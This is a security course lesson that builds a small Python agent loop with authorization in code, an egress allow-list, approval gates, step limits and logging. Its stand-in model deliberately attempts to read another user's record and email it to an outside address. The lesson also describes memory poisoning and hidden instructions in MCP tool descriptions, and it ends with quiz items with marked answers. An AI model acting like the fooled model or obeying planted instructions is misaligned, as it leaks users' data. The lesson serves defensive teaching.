---
title: Building an agent safely
summary: Write a working agent loop in Python, with authorization outside the model, approval gates, limits and logs, then add retrieval and MCP without losing control.
month: 18
minutes: 60
builds: a small tool-using agent whose rules survive a fooled model
source: OWASP Top 10 for Agentic Applications | https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
words: agent loop, least-privilege tool, approval gate
---
Security people who can build are far more useful than those who only criticise. Here you'll write a real agent loop. It's short, it runs, and it's designed around one assumption: **the model will eventually do what an attacker wants.** The question is what happens then.

@term agent loop = The cycle of asking a model what to do, running the action, and giving it the result.
@term least-privilege tool = A tool that can do only the narrow job an agent needs.
@term approval gate = A pause where a person must confirm an action before it happens.
@term memory poisoning = Planting text in an agent's memory so that it misbehaves in later sessions.
@term tool description = The text telling a model what a tool does, which is itself read as input.

## The loop

An agent is smaller than people think. Here's the whole thing, using only the standard library. `fake_model` stands in for any real model, so you can run this with no account, and it plays a fooled model on purpose.

@seq User | App | Model | Tool
User > App: A question
App > Model: Question + tool list
Model > App: Please call this tool
App > Tool: Only if the user may
Tool > App: A result, treated as data
App > Model: The result
Model > App: An answer
App > User: The answer

```python
import json

CUSTOMERS = {
    "C-1": {"owner": "sara", "email": "sara@oasis.example"},
    "C-2": {"owner": "omar", "email": "omar@oasis.example"},
}
ALLOWED_DOMAINS = {"oasis.example"}
MAX_STEPS = 5

def lookup_customer(user, customer_id):
    record = CUSTOMERS.get(customer_id)
    if record is None or record["owner"] != user:   # authorization, in code
        return {"error": "not allowed"}
    return record

def send_email(user, to, body):
    if to.split("@")[-1] not in ALLOWED_DOMAINS:    # egress allow-list
        return {"error": "destination refused"}
    return {"needs_approval": True, "to": to}       # a human confirms it

TOOLS = {"lookup_customer": lookup_customer, "send_email": send_email}

def fake_model(messages):
    """Replace this with a real model call. It acts as if it's been fooled."""
    calls = [m for m in messages if m["role"] == "tool"]
    if not calls:
        return {"tool": "lookup_customer", "args": {"customer_id": "C-2"}}
    if len(calls) == 1:
        return {"tool": "send_email",
                "args": {"to": "drop@files-archive.example", "body": "records"}}
    return {"answer": "Done."}

def run_agent(user, question):
    messages = [{"role": "system", "content": "You help with support tickets."},
                {"role": "user", "content": question}]
    for _ in range(MAX_STEPS):                      # a bounded loop
        reply = fake_model(messages)
        if "answer" in reply:
            return reply["answer"]
        name = reply["tool"]
        if name not in TOOLS:                       # no invented tools
            result = {"error": "unknown tool"}
        else:
            result = TOOLS[name](user, **reply["args"])
        print(json.dumps({"user": user, "tool": name,   # log every call
                          "args": reply["args"], "result": result}))
        messages.append({"role": "tool", "content": json.dumps(result)})
    return "Stopped: too many steps."

print(run_agent("sara", "Summarise ticket 103"))
```

Save it as `agent.py` and run it with `python3 agent.py`. This is what prints:

```
{"user": "sara", "tool": "lookup_customer", "args": {"customer_id": "C-2"}, "result": {"error": "not allowed"}}
{"user": "sara", "tool": "send_email", "args": {"to": "drop@files-archive.example", "body": "records"}, "result": {"error": "destination refused"}}
Done.
```

The model tried to steal Omar's record and send it outside. Both attempts failed, and nothing in that code depends on the model being honest.

?? In this code, what stops Sara's session from reading Omar's record?
+ The ownership check inside the tool's own code
- A polite instruction in the system prompt there
- The fake model, which always behaves correctly anyway
- The JSON format of the logged tool calls
=> The check runs in your code, using the real user, and the model can't talk its way past it.

## Five rules in that code

| Rule | Where | Stops |
|---|---|---|
| The tool gets the real user from your code, not the model | `TOOLS[name](user, ...)` | A model that claims to be someone else |
| Check permissions inside each tool | `record["owner"] != user` | Reading other people's data |
| Limit destinations | `ALLOWED_DOMAINS` | Sending data out |
| Bound the loop | `MAX_STEPS` | Runaway costs and loops |
| Log every call | `print(json.dumps(...))` | Silent misuse, and it gives you evidence |

Notice that `user` is passed in by your program. If the model could supply it, then it could lie. Identity should always come from your session, never from the model's output.

@drill ai-control

?? Why must the user's identity not come from the model's own output?
+ A fooled model could simply claim anything
- Models can't spell any user names correctly
- The identity field makes tokens more expensive
- JSON can't represent any user names correctly
=> Anything the model writes may be controlled by an attacker. Trusted facts must come from your own session.

## Designing tools

Make tools small and specific. A bad tool is `run_sql(query)`, and a good one is `get_order_status(order_id)`. The first can do anything, so you've handed your database to a text predictor.

| Instead of | Prefer |
|---|---|
| `run_shell(command)` | `restart_service(name)`, from a fixed list |
| `send_email(to, body)` | `reply_to_ticket(ticket_id, body)` |
| `read_file(path)` | `get_policy(name)` |

Split reading from doing. Keep **approval gates** for anything hard to undo: payments, deletions, messages to outsiders. Show the person the real action, not the model's description of it, since that summary could be a lie as well.

?? An agent needs order statuses. Which tool design is safest?
+ `get_order(id)`, checked against the signed-in user
- `run_sql(query)`, with a prompt warning attached
- `read_table(name)`, covering all the database tables
- `http_get(url)`, reaching any internal web address
=> Narrow tools limit what a fooled model can do. The risk lives in what the tool allows.

## Adding retrieval

RAG adds a new path for attackers, so apply your rules there too.

- **Filter by permission at retrieval time**, in your code, using the real user.
- **Mark retrieved text clearly as data**, knowing that this helps but doesn't guarantee anything.
- **Record where each piece came from**, so that you can investigate. That's the `source_doc` field you used in the missions.
- **Watch what gets indexed.** Whoever can add a document can add instructions.

Long-term memory deserves the same suspicion. **Memory poisoning** means that a bad message today can quietly shape behaviour next week. Store what's needed, show users what's stored, and let them clear it.

?? Where should permission filtering happen in a RAG system?
+ In your code, before documents reach the model
- In the prompt, asking it to respect access
- In the user's browser, after the answer arrives
- Nowhere, since all embeddings are already fully anonymous
=> Once text is in the prompt, the model can reveal it. Filter first, so it never sees what the user couldn't.

## Connecting tools with MCP

The [Model Context Protocol](https://modelcontextprotocol.io/) lets an AI app connect to tools through a standard. That's convenient, and it widens your supply chain.

| Risk | Control |
|---|---|
| A tool's description contains hidden instructions | Treat descriptions as untrusted, and review them |
| A server changes after you approved it | Pin versions, and review updates |
| A server holds broad tokens | Give each one its own narrow credentials |
| Many tools combine into the trifecta | Assess the whole set, not each tool alone |

Installing an MCP server means trusting code. Vet it as you'd vet a dependency.

?? Why review the description text of a third-party tool?
+ The model reads it, so it can steer
- Long descriptions make the tool run more slowly
- Descriptions are displayed to customers on the website
- It must be written in formal legal English
=> A tool's description enters the context, so a malicious one can steer the model. It's input like any other.

## Connect a real model

To swap in a real model, replace `fake_model` with a call to your provider's API, translating its tool-call format into `{"tool": ..., "args": ...}`. Nothing else in the loop has to change, and the safety rules stay exactly where they are. That's the sign of a good design: the model is a replaceable part, and the controls aren't inside it.

::: try Start P15
Extend this into a support assistant with one lookup tool and one action tool, then put it in a container you can reset. See [project P15](/projects/P15/). In the next lesson, you'll attack your own creation.
:::

?! Pick an action from your own life, such as paying a bill. If an agent did it, which rules from this lesson would you require, and why?

### Go further

Primary sources and the best free material on this topic, all checked in November 2026:

- [Anthropic, Building effective agents](https://www.anthropic.com/engineering/building-effective-agents)
- [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/)
